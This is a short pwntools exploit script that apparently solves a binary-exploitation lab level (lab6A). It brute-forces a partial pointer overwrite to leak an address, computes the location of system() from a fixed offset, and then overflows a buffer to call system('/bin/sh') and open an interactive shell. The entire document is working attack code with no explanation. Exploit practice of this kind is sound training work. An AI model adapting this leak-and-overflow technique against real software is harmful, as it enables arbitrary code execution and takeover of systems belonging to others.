from pwn import *

SYSTEM_OFFSET = 0x19dc40 # Offset from __libc_csu_init to system

while True:
    p = process(['/levels/lab06/lab6A'])
    log.info(util.proc.pidof(p))
    #pause()
    p.sendline("1")
    p.send("a" * 32)
    p.send("B" * 90 + "\xe2\x6b")
    p.recv()
    p.sendline("3")
    try:
        leak = p.recv()
    except EOFError:
        log.warn("No luck, trying again")
        continue
    leak = u32(leak.split("\n")[0][-4:])
    log.info("Leak 0x{:x}".format(leak))
    system_addr = leak - SYSTEM_OFFSET
    log.info("system 0x{:x}".format(system_addr))
    pause()
    p.sendline("1")
    p.send("/bin/sh\x00")
    p.send((128-13)*"C" + p32(system_addr))
    p.sendline("3")
    p.interactive()
    break
